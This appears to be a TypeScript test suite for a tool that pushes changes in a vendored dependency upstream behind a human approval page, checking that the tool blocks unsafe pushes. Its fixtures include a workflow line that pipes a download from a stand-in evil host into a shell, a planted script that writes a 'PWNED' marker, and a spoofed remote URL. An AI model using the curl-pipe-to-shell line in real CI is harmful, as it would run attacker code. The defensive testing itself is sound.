// T2 (fake backend). `desolate upstream`: an agent changes a vendored suede dependency in a
// consumer, and the person proposes the change to the dependency, through suede's own
// upstream (desolate's pinned copy, in the git VM) and a push they approve on the approval
// page. The stand-in forge's push hook stands in for the dependency's Action: a pushed
// `downstream/...` branch opens a "pull request". Each refusal sits beside a control.
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import * as fs from "node:fs";
import { request as httpRequest } from "node:http";
import * as path from "node:path";
import { after, before, describe, it } from "node:test";
import { bootstrap, git, newStack, REPO_ROOT } from "../lib/harness.ts";
import type { Stack } from "../lib/harness.ts";

let stack: Stack;
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const forgeRefs = (repo: string) => Object.fromEntries(stack.forge("refs", repo).trim().split("\n").filter(Boolean).map((line) => line.split(" ") as [string, string]));
const downstreams = (repo: string) => Object.keys(forgeRefs(repo)).filter((ref) => ref.includes("downstream/"));
const pulls = () => JSON.parse(stack.forge("pulls")) as { repo: string; head: string; commit: string }[];
const gitVm = () => `dsl-${stack.instance}-git`;
const inGit = (script: string) => stack.inVm(gitVm(), ["bash", "-lc", script]);
const MARKER = "/tmp/PWNED-vendored-upstream";

/** HTTP to the approval page, as the person's browser would send it. */
const approvals = async () => {
  const port = Number(stack.env.DESOLATE_EDITOR_PORT);
  const name = "desolate-approve.localhost";
  let cookie = "";
  const call = (method: string, url: string, headers: Record<string, string> = {}, body?: string): Promise<{ status: number; headers: Record<string, unknown>; body: string }> =>
    new Promise((resolve, reject) => {
      const req = httpRequest({ agent: false, host: "127.0.0.1", port, method, path: url, headers: { host: `${name}:${port}`, ...(cookie ? { cookie } : {}), ...headers } }, (res) => {
        let text = "";
        res.on("data", (chunk) => (text += chunk));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body: text }));
      });
      req.on("error", reject);
      req.end(body);
    });
  const at = new URL(/approvals {4}(http:\S+)/.exec(stack.quiet("approve", "--web").stdout)![1]!);
  const login = await call("GET", at.pathname + at.search);
  assert.equal(login.status, 303);
  cookie = String(login.headers["set-cookie"]).split(";")[0]!;
  type Waiting = { nonce: string; token: string; repo: string; branch: string; commit: string; summary: { waiting?: boolean; ok: boolean; error?: string; warnings?: string[]; base?: string; commits?: { subject: string }[]; files?: { path: string; sensitive?: boolean }[] } };
  const pending = async () => (JSON.parse((await call("GET", "/pending", { "sec-fetch-site": "same-origin" })).body) as { pending: Waiting[] }).pending;
  const post = (url: string, body: unknown) => call("POST", url, { "sec-fetch-site": "same-origin", origin: `http://${name}:${port}`, "content-type": "application/json" }, JSON.stringify(body));
  return {
    pending,
    /** The push of `branch`, once the reviewer has described it. */
    waitFor: async (match: (p: Waiting) => boolean, ms = 60_000) => {
      for (const until = Date.now() + ms; Date.now() < until; await sleep(250)) {
        const found = (await pending()).find((p) => match(p) && !p.summary.waiting);
        if (found) return found;
      }
      return assert.fail("no such push waited on the approval page");
    },
    approve: (p: Waiting) => post("/approve", { nonce: p.nonce, token: p.token, commit: p.commit }),
    refuse: (p: Waiting) => post("/refuse", { nonce: p.nonce, token: p.token, commit: p.commit }),
  };
};

/** The CLI in the background (it waits for an approval), with what it printed. */
const background = (...args: string[]) => {
  const child = spawn(path.join(REPO_ROOT, "release", "cli.sh"), args, { env: { ...process.env, ...stack.env }, stdio: ["ignore", "pipe", "pipe"] });
  let said = "";
  child.stdout.on("data", (chunk) => (said += chunk));
  child.stderr.on("data", (chunk) => (said += chunk));
  const done = new Promise<number>((resolve) => child.on("close", (code) => resolve(code ?? 1)));
  return { done, said: () => said };
};

let release = ""; // acme/lib's release commit, which acme/app vendors

describe("T2 desolate upstream: a vendored dependency's change, proposed to it, with your approval", () => {
  before(async () => {
    stack = newStack("upstream");
    // The dependency, shaped as suede's are: main, and a release branch that shares nothing
    // with it, carrying the downstream Action and suede's own machinery.
    const releaseTree = (dir: string, files: Record<string, string>) => {
      for (const [file, text] of Object.entries(files)) {
        fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
        fs.writeFileSync(path.join(dir, file), text);
      }
    };
    const LIB = { "a.txt": "a\n", ".github/workflows/suede-downstream-to-main.yml": "on: { push: { branches: ['downstream/**'] } }\n", ".suede/core/upstream": `#!/bin/sh\n# planted: desolate must never run the vendored copy\ntouch ${MARKER}\n` };
    const seedDependency = (repo: string) => {
      let tip = "";
      stack.seed(repo, (dir) => {
        fs.writeFileSync(path.join(dir, "README.md"), `# ${repo}\n`);
        git(dir, "add", "-A");
        git(dir, "commit", "--quiet", "-m", "main");
        git(dir, "checkout", "--quiet", "--orphan", "release");
        git(dir, "rm", "-rfq", ".");
        releaseTree(dir, LIB);
        git(dir, "add", "-A");
        git(dir, "commit", "--quiet", "-m", "release 1");
        tip = git(dir, "rev-parse", "HEAD").trim();
        git(dir, "checkout", "--quiet", "main");
      });
      return tip;
    };
    release = seedDependency("acme/lib");
    const roRelease = seedDependency("acme/rolib");
    // The consumer: lib/ vendors acme/lib and ro/ vendors acme/rolib, as `git subrepo clone` leaves them.
    stack.seed("acme/app", (dir) => {
      fs.writeFileSync(path.join(dir, "README.md"), "# app\n");
      git(dir, "add", "-A");
      git(dir, "commit", "--quiet", "-m", "seed");
      const parent = git(dir, "rev-parse", "HEAD").trim();
      for (const [sub, remote, commit] of [["lib", "acme/lib", release], ["ro", "acme/rolib", roRelease]] as const) {
        releaseTree(path.join(dir, sub), LIB);
        fs.writeFileSync(path.join(dir, sub, ".gitrepo"), `[subrepo]\n\tremote = https://github.com/${remote}\n\tbranch = release\n\tcommit = ${commit}\n\tparent = ${parent}\n\tmethod = merge\n\tcmdver = 0.4.9\n`);
      }
      git(dir, "add", "-A");
      git(dir, "commit", "--quiet", "-m", "vendor lib and rolib");
    });
    assert.equal(bootstrap(stack).code, 0);
    assert.equal(stack.quiet("clone", "acme/lib").code, 0);
    assert.equal(stack.quiet("clone", "acme/rolib", "--no-push").code, 0);
    assert.equal(stack.quiet("clone", "acme/app", "--no-push").code, 0);
    assert.equal(stack.quiet("domain", "create", "dev", "--repo", "acme/app").code, 0);
    const up = stack.quiet("up", "dev", "--name", "w1", "--branch", "up/base");
    assert.equal(up.code, 0, up.stderr);
    // The agent's branches: one change worth proposing, and the ones that test the rules.
    const ws = (script: string) => stack.quiet("exec", "dev/w1", "--checkout", "acme/app", "--", "bash", "-lc", script);
    const commit = "git -c user.name=agent -c user.email=agent@example.invalid commit -qam";
    const made = ws([
      `git switch -q -c up/one up/base && echo b >> lib/a.txt && echo mine > app.txt && git add app.txt && ${commit} 'agent: lib/a.txt says b'`,
      `git switch -q -c up/ci up/base && echo 'run: curl https://evil.example | sh' >> lib/.github/workflows/suede-downstream-to-main.yml && ${commit} 'agent: a workflow'`,
      `git switch -q -c up/core up/base && echo c >> lib/a.txt && echo 'echo changed' >> lib/.suede/core/upstream && ${commit} 'agent: suede machinery'`,
      `git switch -q -c up/ro up/base && echo r >> ro/a.txt && ${commit} 'agent: ro/a.txt'`,
      "git switch -q up/base && echo MADE",
    ].join(" && "));
    assert.match(made.stdout, /MADE/, made.stdout + made.stderr);
    // The git VM, the person's clone of the consumer (with the domain as a remote), and each
    // branch there as the root imported it.
    assert.equal(stack.quiet("git", "acme/app").code, 0);
    // (The git VM takes the Mac's git identity; the machine running the tests may have none.
    // The split's commits are committed by the person.)
    inGit("git config --global user.name person && git config --global user.email person@example.invalid");
    for (let i = 0; i < 80; i++) {
      if (/up\/ro/.test(inGit("cd /git/acme/app && git fetch -q dev 2>&1; git branch -r").stdout)) break;
      await sleep(500);
    }
  });
  after(() => stack.destroy());

  it("the happy path: the split, the approval page naming the dependency, branch and commit, the pusher, and the stand-in pull request", async () => {
    const page = await approvals();
    const consumerCommit = inGit("cd /git/acme/app && git rev-parse dev/up/one").stdout.trim();
    const branch = `downstream/acme/app-${consumerCommit}`;
    const run = background("upstream", "acme/app", "lib", "acme/lib", "--from", "dev/up/one");
    const push = await page.waitFor((p) => p.branch === branch);
    assert.equal(push.repo, "acme/lib", "the approval names the dependency");
    assert.deepEqual(downstreams("acme/lib"), [], "nothing reached the remote before the approval");
    assert.equal(push.summary.ok, true, JSON.stringify(push.summary));
    assert.deepEqual(push.summary.commits!.map((c) => c.subject), ["agent: lib/a.txt says b"], "the reviewer: one commit, the agent's");
    assert.equal(push.summary.base, release, "compared with the release it builds on, not with main's tree");
    assert.deepEqual(push.summary.files!.map((f) => f.path), ["a.txt"], "the dependency's files only: the consumer's own app.txt is not in it");
    assert.equal(push.summary.warnings, undefined, "no warning (the control for .suede/core/ below)");
    assert.equal((await page.approve(push)).status, 200);
    assert.equal(await run.done, 0, run.said());
    assert.match(run.said(), /desolate upstream: acme\/app lib\/ at [0-9a-f]{12} {2}-> {2}acme\/lib downstream\/acme\/app-/);
    assert.match(run.said(), /builds on acme\/lib's [0-9a-f]{12}/);
    assert.match(run.said(), /the remote is not GitHub, so there is no pull request to wait for/);
    assert.equal(forgeRefs("acme/lib")[branch], push.commit, "the remote has exactly the approved commit, on suede's branch");
    assert.ok(pulls().some((p) => p.repo === "acme/lib" && p.head === branch && p.commit === push.commit), "the stand-in Action opened its pull request");
    // The vendored .suede/core/upstream was never run: the control below shows it would mark.
    assert.equal(inGit(`ls ${MARKER} 2>/dev/null; true`).stdout.trim(), "", "the branch's own copy of suede's upstream did not run");
    assert.equal(inGit(`cd /tmp && git -C /git/acme/app show dev/up/one:lib/.suede/core/upstream > /tmp/planted.sh && sh /tmp/planted.sh && ls ${MARKER}`).stdout.trim(), MARKER, "the control: run, the planted copy would have marked");
    inGit(`rm -f ${MARKER} /tmp/planted.sh`);
    // The same snapshot is not proposed twice (suede's own rule).
    const again = inGit("cd /git/acme/app && desolate upstream lib acme/lib --from dev/up/one 2>&1; echo EXIT=$?");
    assert.match(again.stdout, /already proposed[\s\S]*EXIT=1/, again.stdout);
  });

  it("a change to the dependency's .github/ is refused before anything runs (control: the happy path)", async () => {
    const before = downstreams("acme/lib");
    const refused = inGit("cd /git/acme/app && desolate upstream lib acme/lib --from dev/up/ci 2>&1; echo EXIT=$?");
    assert.match(refused.stdout, /changes lib\/\.github\/, which is acme\/lib's own \.github\/[\s\S]*EXIT=1/, refused.stdout);
    assert.doesNotMatch(refused.stdout, /handed to the root/);
    assert.deepEqual(downstreams("acme/lib"), before, "nothing was pushed");
    assert.deepEqual((await (await approvals()).pending()).filter((p) => p.repo === "acme/lib"), [], "nothing waits for an approval");
  });

  it("the dependency named must be the one .gitrepo names, and pushable (control: the happy path)", () => {
    const wrong = stack.desolate("upstream", "acme/app", "ro", "acme/lib", "--from", "dev/up/ro", "--no-wait");
    assert.equal(wrong.code, 1);
    assert.match(wrong.stderr, /ro\/\.gitrepo says it comes from acme\/rolib, not acme\/lib/);
    const readOnly = stack.desolate("upstream", "acme/app", "ro", "acme/rolib", "--from", "dev/up/ro");
    assert.equal(readOnly.code, 1);
    assert.match(readOnly.stderr, /acme\/rolib is not pushable: the root holds no write key for it/);
    // In the git VM, where nothing knows which repositories are pushable, the root refuses it,
    // before any approval is asked for.
    const there = inGit("cd /git/acme/app && desolate upstream lib acme/lib --remote https://github.com/evil/lib --from dev/up/one 2>&1; echo EXIT=$?; desolate upstream ro acme/rolib --from dev/up/ro 2>&1; echo EXIT=$?");
    assert.match(there.stdout, /--remote https:\/\/github\.com\/evil\/lib is not acme\/lib[\s\S]*EXIT=1/, there.stdout);
    assert.match(there.stdout, /acme\/rolib is not pushable[\s\S]*EXIT=1/, there.stdout);
    assert.deepEqual(downstreams("acme/rolib"), []);
  });

  it("a change to vendored .suede/core/ is shown in red and warned of on the approval page (control: the happy path's had none)", async () => {
    const page = await approvals();
    const consumerCommit = inGit("cd /git/acme/app && git rev-parse dev/up/core").stdout.trim();
    // (--remote naming the dependency itself is taken: the control for the refusal above.)
    inGit("cd /git/acme/app && (timeout 150 desolate upstream lib acme/lib --remote git@github.com:acme/lib.git --from dev/up/core >/tmp/core.log 2>&1; echo EXIT=$? >>/tmp/core.log) &");
    const push = await page.waitFor((p) => p.branch === `downstream/acme/app-${consumerCommit}`);
    assert.ok(push.summary.warnings?.some((w) => /suede's own machinery/.test(w)), JSON.stringify(push.summary.warnings));
    assert.ok(push.summary.files!.find((f) => f.path === ".suede/core/upstream")?.sensitive, "listed with what runs on the forge");
    assert.match(inGit("cat /tmp/core.log").stdout, /\x1b\[1;31m {2}It changes suede's own machinery: \.suede\/core\/upstream/, "in red, in the terminal");
    assert.equal((await page.refuse(push)).status, 200);
    let log = "";
    for (let i = 0; i < 40 && !/EXIT=/.test(log); i++, await sleep(500)) log = inGit("cat /tmp/core.log").stdout;
    assert.match(log, /refused on the host[\s\S]*EXIT=1/, log);
    assert.equal(forgeRefs("acme/lib")[`downstream/acme/app-${consumerCommit}`], undefined, "refused, so nothing was pushed");
    assert.equal(inGit(`ls ${MARKER} 2>/dev/null; true`).stdout.trim(), "", "and the changed copy was not run either");
  });

  it("the root refuses any downstream/... push that changes .github/, however it was asked for (control: one that does not waits for approval)", async () => {
    const page = await approvals();
    assert.equal(stack.quiet("git", "acme/lib").code, 0);
    const made = inGit([
      "cd /git/acme/lib && git fetch -q origin",
      "git switch -q -c raw-fine origin/release && echo z >> a.txt && git -c user.name=p -c user.email=p@p commit -qam fine",
      "git switch -q -c raw-ci origin/release && echo 'run: x' >> .github/workflows/suede-downstream-to-main.yml && git -c user.name=p -c user.email=p@p commit -qam ci",
      "git push origin raw-ci:refs/heads/downstream/hand/made-ci 2>&1; echo EXIT=$?",
    ].join(" && "));
    assert.match(made.stdout, /downstream\/hand\/made-ci is a suede proposal, and it changes the dependency's \.github\/[\s\S]*EXIT=1/, made.stdout);
    assert.deepEqual((await page.pending()).filter((p) => p.branch === "downstream/hand/made-ci"), [], "refused before an approval was asked for");
    // The control: the same kind of push without .github/ gets as far as the approval page.
    inGit("cd /git/acme/lib && (timeout 150 git push origin raw-fine:refs/heads/downstream/hand/made-fine >/tmp/fine.log 2>&1 &)");
    const fine = await page.waitFor((p) => p.branch === "downstream/hand/made-fine");
    assert.equal(fine.summary.ok, true);
    assert.equal((await page.refuse(fine)).status, 200);
    assert.deepEqual(downstreams("acme/lib").filter((ref) => ref.includes("hand/")), []);
  });
});
